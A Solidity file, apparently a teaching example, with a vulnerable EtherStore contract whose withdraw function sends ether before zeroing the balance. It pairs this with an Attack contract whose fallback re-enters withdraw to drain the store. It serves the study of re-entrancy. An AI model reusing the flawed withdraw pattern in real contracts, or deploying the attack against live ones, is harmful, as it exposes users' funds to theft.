// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// In Re-entrancy there are 2 contracts A,B and let's say contract A calls contract B and re-entrancy exploits allows B to call A while contract A is still executing
contract EtherStore{
    mapping(address=>uint) public balances;

    // In order to deposit the amount
    function deposit() public payable{
        balances[msg.sender]=balances[msg.sender]+msg.value;
    }

    // to withdraw the amount
    function withdraw() public{
        uint userBalance=balances[msg.sender];
        require(userBalance>0,"Insufficient balance");

        // to send the ether
        (bool sent,)=msg.sender.call{value:userBalance}("");
        require(sent,"Failed to sent ether");

        // in order to deduct the amount
        balances[msg.sender]=0;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Attack{
    // we will store the target contract in a state variable called etherStore
    EtherStore public etherStore;
    uint256 public constant AMOUNT=1 ether;

    constructor(address _etherStoreAddress){
        etherStore=EtherStore(_etherStoreAddress);
    }

    fallback() external payable{
        if(address(etherStore).balance>=AMOUNT){
            etherStore.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value>=AMOUNT,"Amount is less than 1 ether");

        // the way to send ether in another contract in solidity
        etherStore.deposit{value:AMOUNT}();
        etherStore.withdraw();
    }

    function getBalance() external view returns (uint){
        return address(this).balance;
    }
}